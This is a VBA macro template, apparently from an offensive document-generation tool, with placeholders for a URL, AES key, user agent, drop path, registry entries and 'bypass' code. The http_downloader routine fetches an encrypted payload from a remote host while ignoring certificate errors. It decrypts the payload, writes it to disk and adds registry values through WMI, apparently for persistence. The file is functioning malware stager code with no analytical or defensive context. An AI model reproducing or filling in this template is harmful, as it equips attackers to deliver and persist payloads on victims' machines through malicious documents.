{{bypassCode}}

{{moduleCode}}

Function WmiRegSetValue(ByVal hRootKey As Long, ByVal szSubKeyName As String, ByVal szValueName As String, ByVal dwType As Long, ByVal vValueData As Variant) As Long
    Dim objWbemLocator As Object
    Dim objRegistryProvider As Object
    Dim dwErrorCode As Long
    Set objWbemLocator = CreateObject("WbemScripting.SWbemLocator")
    Set objRegistryProvider = objWbemLocator.ConnectServer(".", "root\cimv2").get("StdRegProv")
    dwErrorCode = objRegistryProvider.CreateKey(hRootKey, szSubKeyName)
    If dwErrorCode = 0 Then
        Select Case dwType
        Case REG_SZ
            dwErrorCode = objRegistryProvider.SetStringValue(hRootKey, szSubKeyName, szValueName, CStr(vValueData))
        Case REG_EXPAND_SZ
            dwErrorCode = objRegistryProvider.SetExpandedStringValue(hRootKey, szSubKeyName, szValueName, CStr(vValueData))
        Case REG_DWORD
            dwErrorCode = objRegistryProvider.SetDWORDValue(hRootKey, szSubKeyName, szValueName, CLng(vValueData))
        Case Else
            dwErrorCode = -1
        End Select
    End If
    WmiRegSetValue = dwErrorCode
    Set objRegistryProvider = Nothing
    Set objWbemLocator = Nothing
End Function


Private Function ExpandString(lpInputString As String) As String
    Dim dwSize As Long
    Dim szResult As String
    dwSize = 0
    szResult = Space$(dwSize)
    dwSize = m_ExpandEnvironmentStrings(lpInputString, szResult, dwSize)
    szResult = Space$(dwSize)
    dwSize = m_ExpandEnvironmentStrings(lpInputString, szResult, dwSize)
    ExpandString = Left$(szResult, dwSize - 1)
End Function

Private Function B64Decode(szBase64String As String) As Byte()
    Dim lpBytes() As Byte
    Dim objUtf8 As Object
    Dim objBase64Decoder As Object
    Set objUtf8 = CreateObject("System.Text.UTF8Encoding")
    Set objBase64Decoder = CreateObject("System.Security.Cryptography.FromBase64Transform")
    lpBytes = objUtf8.GetBytes_4(szBase64String)
    B64Decode = objBase64Decoder.TransformFinalBlock((lpBytes), 0, LenB(lpBytes))
    Set objUtf8 = Nothing
    Set objBase64Decoder = Nothing
End Function

Private Function SHA256String(sIn As String) As Byte()
    Dim objUtf8 As Object
    Dim objSHA256 As Object
    Dim lpTextToHash() As Byte
    Set objUtf8 = CreateObject("System.Text.UTF8Encoding")
    Set objSHA256 = CreateObject("System.Security.Cryptography.SHA256Managed")
    lpTextToHash = objUtf8.GetBytes_4(sIn)
    SHA256String = objSHA256.ComputeHash_2((lpTextToHash))
    Set objUtf8 = Nothing
    Set objSHA256 = Nothing
End Function

Private Function AESDecryptBytes(ByRef lpEncryptedBytes() As Byte, ByRef lpAesKeyBytes() As Byte, ByRef lpIvBytes() As Byte, ByRef lpPlainTextBytes() As Byte)
    Dim objAesDec As Object
    Dim objAes As Object
    Set objAes = CreateObject("System.Security.Cryptography.RijndaelManaged")
    Set objAesDec = objAes.CreateDecryptor_2((lpAesKeyBytes), (lpIvBytes))
    lpPlainTextBytes = objAesDec.TransformFinalBlock((lpEncryptedBytes), 0, (UBound(lpEncryptedBytes) - LBound(lpEncryptedBytes) + 1))
    Set objAesDec = Nothing
    Set objAes = Nothing
End Function


Private Function HttpGet(ByVal szUrl As String, ByVal szUserAgent As String) As Byte()
    Dim objXmlHttp As Object
    On Error Resume Next
    Set objXmlHttp = CreateObject("MSXML2.ServerXMLHTTP")
    objXmlHttp.Open "GET", szUrl, False
    objXmlHttp.setRequestHeader "User-Agent", szUserAgent
    objXmlHttp.setOption 2, 13056
    objXmlHttp.send
    HttpGet = objXmlHttp.responseBody
    Set objXmlHttp = Nothing
End Function

Private Function WriteBytesToFile(ByVal szOutputFileName As String, ByRef lpBinaryBuffer() As Byte)
    Dim iFileNo As Integer
    iFileNo = FreeFile
    Open szOutputFileName For Binary Access Write Lock Read Write As iFileNo
    Put iFileNo, 1, lpBinaryBuffer
    Close iFileNo
End Function


Sub http_downloader()
    Dim szUserAgent As String
    Dim szUrl As String
    Dim szDestination As String
    Dim lpFileContents() As Byte
    Dim lpDecodedBytes() As Byte
    Dim lpAesKeyBytes() As Byte
    Dim lpIvBytes() As Byte
    Dim lpEncryptedBytes() As Byte
    Dim lpDecryptedBytes() As Byte
    Dim lpRegistryMods() As Variant
    {{bypassCalls}}
    {{moduleCalls}}
    lpRegistryMods = Array({{registry_entries}})
    lpAesKeyBytes = SHA256String({{aeskey}})
    szUserAgent = {{useragent}}
    szUrl = {{url}}
    szDestination = {{dest}}
    szDestination = ExpandString(szDestination)
    lpFileContents = HttpGet(szUrl, szUserAgent)
    If (Not Not lpFileContents) = 0 Then
        Exit Sub
    End If
    dwFileContenstSize = (UBound(lpFileContents) - LBound(lpFileContents) + 1)
    If dwFileContenstSize < 17 Then
        Exit Sub
    End If
    lpDecodedBytes = MidB(lpFileContents, 33)
    lpIvBytes = LeftB(lpDecodedBytes, 16)
    lpEncryptedBytes = MidB(lpDecodedBytes, 17)
    AESDecryptBytes lpEncryptedBytes, lpAesKeyBytes, lpIvBytes, lpDecryptedBytes
    If (UBound(lpDecryptedBytes) - LBound(lpDecryptedBytes) + 1) < 1 Then
        Exit Sub
    End If
    WriteBytesToFile szDestination, lpDecryptedBytes
    If UBound(lpRegistryMods) - LBound(lpRegistryMods) + 1 > 0 Then
        For i = LBound(lpRegistryMods) To UBound(lpRegistryMods)
            If UBound(lpRegistryMods(i)) - LBound(lpRegistryMods(i)) + 1 = 5 Then
                WmiRegSetValue CLng(lpRegistryMods(i)(0)), CStr(lpRegistryMods(i)(1)), CStr(lpRegistryMods(i)(2)), CLng(lpRegistryMods(i)(3)), lpRegistryMods(i)(4)
            End If
        Next i
    End If
End Sub
